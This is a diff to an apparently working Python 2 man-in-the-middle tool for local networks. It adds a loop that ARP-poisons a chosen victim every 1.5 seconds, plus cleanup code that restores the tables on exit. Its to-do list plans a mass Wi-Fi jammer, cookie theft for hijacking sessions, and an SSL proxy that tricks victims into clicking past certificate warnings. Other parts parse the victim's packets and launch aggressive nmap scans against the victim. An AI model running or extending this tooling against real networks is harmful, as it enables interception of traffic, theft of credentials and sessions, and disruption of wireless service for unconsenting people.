@@ -5,7 +5,7 @@ Prerequisites: Linux
                nmap (optional)
                nbtscan (optional)
                aircrack-ng
-               Python 2.6+
+            Python 2.6+
                nfqueue-bindings 0.4-3
                scapy
                twisted
@@ -13,11 +13,12 @@ Prerequisites: Linux
 Note:          This script flushes iptables before and after usage.
 
 To do:         1. Rogue DHCP server
-               2. Refactor with lots of smaller functions
-               3. Cookie saver so you can browse using their cookies (how to use nfqueue with multiple queues?)
-               4. Add karma MITM technique
-               5. Add SSL proxy for self-signed cert, and make the script force a single JS popup saying there's a temporary problem with SSL validation and to just click through
-               6. Integrate with wifite
+            Refactor with lots of smaller functions
+            Mass wifi jammer
+            Cookie saver so you can browse using their cookies (how to use nfqueue with multiple queues?)
+            Add karma MITM technique
+            Add SSL proxy for self-signed cert, and make the script force a single JS popup saying there's a temporary problem with SSL validation and to just click through
+            Integrate with wifite
 
 '''
 
@@ -28,7 +29,7 @@ def module_check(module):
     '''
     ri = raw_input(
         '[-] python-%s not installed, would you like to install now? (apt-get install -y python-%s will be run if yes) [y/n]: ' % (
-        module, module))
+            module, module))
     if ri == 'y':
         os.system('apt-get install -y python-%s' % module)
     else:
@@ -72,6 +73,7 @@ import requests
 import sys
 import time
 from signal import SIGINT, signal
+import signal
 import socket
 import fcntl
 
@@ -158,7 +160,6 @@ DN = open(os.devnull, 'w')
 ############################
 
 interface = ''
-
 
 def LANsMain(args):
     global victimIP, interface
@@ -292,6 +293,24 @@ def LANsMain(args):
 
     print ''
 
+    def signal_handler(signal, frame):
+        print 'learing iptables, sending healing packets, and turning off IP forwarding...'
+        logger.close()
+        with open('/proc/sys/net/ipv4/ip_forward', 'r+') as forward:
+            forward.write(ipf)
+        Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
+        Spoof().restore(routerIP, victimIP, routerMAC, victimMAC)
+        os.system('/sbin/iptables -F')
+        os.system('/sbin/iptables -X')
+        os.system('/sbin/iptables -t nat -F')
+        os.system('/sbin/iptables -t nat -X')
+        exit(0)
+
+    signal.signal(signal.SIGINT, signal_handler)
+
+    while 1:
+        Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
+        time.sleep(1.5)
 
 class Spoof():
     def originalMAC(self, ip):
@@ -337,7 +356,19 @@ class Parser():
     def __init__(self, args):
         self.args = args
 
-    def start(self, payload):
+    #def start(self, i, payload): ###This was original Ubuntu compatible code.
+    #def start(self, payload): ###This was original non-Ubuntu code.
+    '''
+    Both were replaced by accepting arguments as an array and then iterating through said array looking for the payload and self.
+    It is now compatible with both Ubuntu and non-Ubuntu linux distros.
+    '''
+    def start(*args):
+        for i in args:
+            if isinstance(i, nfqueue.payload):
+                payload = i
+            else:
+                if not isinstance(i, int):
+                    self = i
         if self.args.pcap:
             if self.args.ipaddress:
                 try:
@@ -1123,7 +1154,7 @@ def threads(args):
         print '[*] Starting ' + R + 'aggressive scan [nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + ']' + W + ' in background; results will be in a file ' + victimIP + '.nmap.txt'
         try:
             n = Thread(target=os.system, args=(
-            'nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + '.nmap.txt ' + victimIP + ' >/dev/null 2>&1',))
+                'nmap -e ' + interface + ' -T4 -A -v -Pn -oN ' + victimIP + '.nmap.txt ' + victimIP + ' >/dev/null 2>&1',))
             n.daemon = True
             n.start()
         except Exception:
